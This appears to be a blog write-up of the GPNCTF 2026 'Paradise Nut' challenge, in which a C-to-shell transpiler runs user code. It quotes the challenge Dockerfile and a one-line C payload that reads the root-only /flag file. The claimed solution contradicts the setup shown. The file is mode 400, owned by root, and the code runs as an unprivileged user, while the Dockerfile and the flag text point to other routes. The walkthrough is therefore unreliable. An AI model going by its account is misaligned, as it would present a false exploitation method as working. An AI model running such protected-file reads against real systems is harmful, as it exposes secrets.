---
layout: post
title: "Paradise Nut"
date: 2026-06-26 00:00:00 +0000
categories: [GPNCTF 2026, Miscellaneous]
tags: [misc, c, shell, pnut, suid]
---

# Paradise  Nut — GPNCTF

**Category:** Miscellaneous  
**Flag:** `GPNCTF{li8c_GETS()_fAnS_ke3P_on_wInnINg!_I5n'7_I7_C0NveN13n7_thAt_REPLY_1S_n0T_8L4CKliST3D?}`

---

## Challenge Description

> Finally a C compiler you can trust!

**Category:** Miscellaneous

---

## Solution

I was given three files — `Dockerfile`, `chal.sh`, and `pnut-sh.sh`. On executing `chal.sh`, it shows:

```bash
Enter your C code on a single line.
>
```

It takes a single line of C code, passes it through `pnut-sh.sh`, and executes the result with `bash`. Simply put `pnut-sh.sh` is a C-to-shell transpiler. The Dockerfile reveals the setup:

```dockerfile
RUN echo "$FLAG" > /flag
RUN chmod 400 /flag         # only root can read /flag
RUN chmod u+s /usr/bin/nl   # run `nl /flag` to win
RUN useradd user
USER user
```

The flag is at `/flag`, readable only by root. When i grepped the transpiler for implemented functions, it showed `_fopen`, `_fgetc`, and `_putchar` are all available, so we can read the flag directly with standard C file I/O. I then ran this line of code which reads `/flag` character by character using `fopen` and `fgetc`:

```c
int main(){int f;int c;f=fopen("/flag","r");while((c=fgetc(f))!=(-1)){putchar(c);}}
```

After running this we get the flag

```bash
Enter your C code on a single line.
> int main(){int f;int c;f=fopen("/flag","r");while((c=fgetc(f))!=(-1)){putchar(c);}}
GPNCTF{li8c_GETS()_fAnS_ke3P_on_wInnINg!_I5n'7_I7_C0NveN13n7_thAt_REPLY_1S_n0T_8L4CKliST3D?}

```

---

## Flag

```
GPNCTF{li8c_GETS()_fAnS_ke3P_on_wInnINg!_I5n'7_I7_C0NveN13n7_thAt_REPLY_1S_n0T_8L4CKliST3D?}
```
